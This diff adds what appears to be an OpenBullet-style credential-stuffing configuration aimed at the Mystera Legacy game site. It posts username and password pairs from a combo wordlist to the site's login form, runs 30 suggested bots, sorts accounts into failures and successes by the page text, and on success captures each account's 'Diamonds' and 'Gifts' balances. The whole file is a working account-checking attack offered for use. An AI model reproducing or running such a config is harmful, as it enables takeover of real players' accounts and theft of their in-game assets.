@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Mystera",
+  "SuggestedBots": 30,
+  "LastModified": "2018-06-15T00:09:09.4146667+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "http://www.mysteralegacy.com/login" AutoRedirect=TRUE 
+  CONTENT "log=<USER>&pwd=<PASS>&wp-submit=Log+In&redirect_to=%2Fplay-mystera-legacy&instance=&action=login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Keywords KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "is incorrect. <a href=\"http://www.mysteralegacy.com/login/?action=lostpassword\">Lost your password?</" 
+    KEY "Invalid username" 
+  KEYCHAIN Success OR 
+    KEY "://www.mysteralegacy.com/logout\">Log Out" 
+#Diamonds PARSE "<SOURCE>" LR "a href=\"//www.mysteralegacy.com/perks\" style=\"text-decoration:none;\"><b>" " <img" Recursive=FALSE -> CAP "Diamonds" "" "" 
+#Gifts PARSE "<SOURCE>" LR "mysteralegacy.com/images/diamond.png\">&nbsp; " " <img" Recursive=FALSE -> CAP "Gifts" "" "" 
